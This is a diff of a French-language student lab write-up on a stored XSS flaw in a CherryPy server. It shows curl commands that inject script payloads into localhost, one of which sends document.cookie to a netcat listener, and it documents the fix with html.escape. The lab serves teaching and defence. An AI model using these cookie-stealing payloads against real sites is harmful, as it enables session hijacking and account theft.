@@ -52,7 +52,7 @@ curl -d 'chaine=<script>alert("hello")</script>'  http://localhost:8080;
 
 * Commande curl pour lire les cookies . 
 
-D'abord il faut lancer la commande netcat : `nc -l -p 4000`
+D'abord il faut lancer la commande netcat : `nc -l -p 8081` et on pourra voir le contenu du cookie dans le terminal où cette commande a été lancé
 
 ```
 curl -d 'chaine=<script>window.location.replace("http://localhost:8081/search?cookie=" %2B document.cookie)</script>'  http://localhost:8080;
@@ -63,6 +63,9 @@ curl -d 'chaine=<script>window.location.replace("http://localhost:8081/search?co
 
 * Rendre un fichier server_xss.py avec la correction de la faille. Expliquez la demarche que vous avez suivi.
 
-On escape la chaine passée en paramètre uniquement avant l'insertion en base de donnée, la chaine inserée ne contiendra donc aucun caractère qui pourrait être interprété comme du html quand on l'insèrera dans la page html.
+   - On escape la chaine passée en paramètre avant l'insertion en base de donnée, la chaine inserée ne contiendra donc aucun caractère qui pourrait être interprété comme du html quand on l'insèrera dans la page html. Comme ceci : `values = (html.escape(post["chaine"]), cherrypy.request.remote.ip)`
+
+   - On peut également escape la chaine dans l'html au cas où des scripts se trouve déja dans la base de donnée comme ceci :  `'''+"\n".join(["<li>" + html.escape(s) + "</li>" for s in chaines])+'''`.  Cette démarche est inutile dans le cas où toutes les requêtes passe par ce serveur qui utilise l'html espace juste avant l'insertion en base de donnée.
+
 
 
